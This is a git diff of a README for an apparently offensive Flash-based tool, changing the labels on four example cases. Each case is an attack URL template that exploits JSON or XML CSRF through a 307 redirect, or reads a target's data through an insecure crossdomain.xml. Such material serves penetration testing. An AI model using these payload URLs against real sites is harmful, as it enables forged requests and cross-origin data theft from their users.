@@ -28,7 +28,7 @@ This is useful for Chrome >=62, where you can't access SWF directly, or if you w
 If you have the questions regarding this repository - ping me in the Twitter: [@h1_sp1d3r](https://twitter.com/h1_sp1d3r)
 
 ## Example cases
-1) Exploit JSON CSRF, POST-based:
+1) Exploit JSON CSRF, POST-based, 307 redirect:
 ```
 https://example.com/test.swf?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
 ```
@@ -36,15 +36,15 @@ or, using HTML wrapper:
 ```
 https://example.com/read.html?jsonData={"test":1}&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint
 ```
-2) Exploit XML CSRF, POST-based:
+2) Exploit XML CSRF, POST-based, 307 redirect:
 ```
 https://example.com/test.swf?jsonData=[xmldada]&php_url=https://example.com/test.php&endpoint=https://sometargethost.com/endpoint&ct=application/xml
 ```
-3) Exploit insecure crossdomain.xml (read data from target), GET-based:
+3) Exploit insecure crossdomain.xml (read data from target), GET-based, no redirect:
 ```
 https://example.com/read.html?jsonData=&endpoint=https://sometargethost.com/endpoint&reqmethod=GET
 ```
-4) Exploit insecure crossdomain.xml (read data from target), POST-based, any content-type supported:
+4) Exploit insecure crossdomain.xml (read data from target), POST-based, any content-type supported, no redirect:
 ```
 https://example.com/read.html?jsonData=somedata&endpoint=https://sometargethost.com/endpoint&ct=text/html
 ```
